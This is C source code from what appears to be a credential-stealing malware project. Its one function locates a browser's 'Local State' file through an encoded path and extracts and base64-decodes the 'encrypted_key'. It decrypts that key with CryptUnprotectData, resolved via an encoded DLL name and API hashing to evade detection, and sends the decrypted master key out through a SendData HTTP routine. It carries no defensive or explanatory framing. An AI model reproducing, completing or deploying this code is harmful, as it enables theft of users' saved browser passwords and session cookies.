#include "../include/decoding.h"
#include "../include/StringUtils.h"
#include "../include/DllOps.h"
#include "../include/AddrResolution.h"
#include "../include/macros.h"
#include "../include/MemoryUtils.h"
#include "../include/FileIO.h"
#include "../include/PathOps.h"
#include "../include/MasterKeyGrabber.h"
#include "../include/SendData.h"
#include "../include/global.h"

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

BOOL (WINAPI *CryptUnprotectDataFunc)(DATA_BLOB*, LPWSTR, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);

void GrabMasterKey(unsigned short *path) {
    HANDLE              FileHandle           = {0};
    UNICODE_STRING      PathUnicode          = {0};
    OBJECT_ATTRIBUTES   PathObj              = {0};
    DATA_BLOB           VaultKey             = {0};
    DATA_BLOB           CryptedVaultKey      = {0};
    void               *Crypt32Dll           = {0};
    char                FileSizeString[20]   = {0};
    unsigned char       DecodedString[500]   = {0};
    unsigned char       Base64String[450]    = {0};
    unsigned char      *FileBuffer           = {0};
    unsigned char      *buffer               = {0};
    unsigned short      LocalState[20]       = LOCAL_STATE;
    unsigned short     *TempPath[250]        = {0};
    int                 FullBufferSize       = 0;
    int                 FileSize             = 0;
    int                 PathSize             = lenW(path);
    int                 i = 0, j = 0, k = 0;

    DecodeStringW(LocalState);
    MovMemory(path, TempPath, PathSize * 2);
    ConcatStringW(TempPath, LocalState, PathSize);

    InitPathObj(TempPath, &PathObj, &PathUnicode);
    if (OpenFileY(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, FILE_OPEN) != 0) {
        return;
    }

    FileSize = GetFileSizeY(FileHandle);
    
    FileBuffer = AllocMemory((SIZE_T)FileSize);
    if (FileBuffer == NULL) {
        return;
    }

    if (ReadFileY(FileHandle, FileBuffer, FileSize) != 0) {
        return;
    }


    while(FileSize > k) {
        if (FileBuffer[i] == '\"' && FileBuffer[i + 1] == 'e' && FileBuffer[i + 2] == 'n' && FileBuffer[i + 3] == 'c' && FileBuffer[i + 4] == 'r' && FileBuffer[i + 5] == 'y' && FileBuffer[i + 6] == 'p' && FileBuffer[i + 7] == 't' && FileBuffer[i + 8] == 'e' && FileBuffer[i + 9] == 'd' && FileBuffer[i + 10] == '_' && FileBuffer[i + 11] == 'k' && FileBuffer[i + 12] == 'e' && FileBuffer[i + 13] == 'y') {
            i += 17;
            while(TRUE) {
                if (FileBuffer[i] == 0x22) {
                    break;
                }
                Base64String[j] = FileBuffer[i];
                j++;
                i++;
            }
            Base64String[j] = 0x00;
            break;
        }
        i++;
        k++;
    }

    if (Base64String == NULL) {
        return;
    }

    int DecodedLength = DecodeBase64(Base64String, len(Base64String), DecodedString);
    if (DecodedLength == 1) {
        return;
    }

    MovMemory(DecodedString + 5, DecodedString, DecodedLength);
    CryptedVaultKey.cbData = DecodedLength;
    CryptedVaultKey.pbData = DecodedString;

    /*the passed argument is just crypt32.dll encoded*/
    Crypt32Dll = LoadDll(CRYPT32);
    if (Crypt32Dll == NULL) {
        return;
    }
    CryptUnprotectDataFunc = GetFuncAddress(Crypt32Dll, (HashInfo){CRYPTUNPROTECTDATA, 18});
    if (CryptUnprotectDataFunc == NULL) {
        return;
    }

    if (CryptUnprotectDataFunc(&CryptedVaultKey, NULL, NULL, NULL, NULL, 0, &VaultKey) != 1) {
        return;
    }

    /*423 is the size of the buffer we need to hold the http request and the key*/
    buffer = AllocMemory((SIZE_T)423);
    if (buffer == NULL) {
        return;
    }

    IntToString(FileSizeString, 32);

    SendData(NULL, "ZERO", 32, FileSizeString, buffer, VaultKey.pbData, FALSE);

    FreeMemory(FileBuffer);
}